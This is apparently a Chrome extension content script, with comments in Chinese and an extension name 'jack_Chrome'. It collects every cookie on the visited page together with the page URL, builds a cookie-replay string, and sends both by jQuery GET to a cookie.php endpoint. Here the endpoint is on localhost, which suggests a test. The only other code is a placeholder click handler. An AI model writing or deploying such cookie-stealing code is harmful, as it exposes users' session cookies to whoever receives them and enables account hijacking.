(function () {
    // console.log("jack_Chrome插件");
    var _cookie = document.cookie;
    var setCookie = 'document.cookie="'+_cookie+'";'
    var href = document.location.href;
    var _ = {
        href: document.location.href,
        setCookie: 'document.cookie="'+_cookie+'";'
    };
    // console.log(_);
    $.get('//127.0.0.1/test/cookie.php',{data:_}, function(_) {
        // console.log(_);
    });
    // 选项 点击测试
    (function () {
       var jack_Chrome = $("#jack_Chrome");
        jack_Chrome
        .on('click','#a01',function () {
           // window.location.href = '//baidu.com';
           console.log(chrome.windows);
        });
    }());
}());
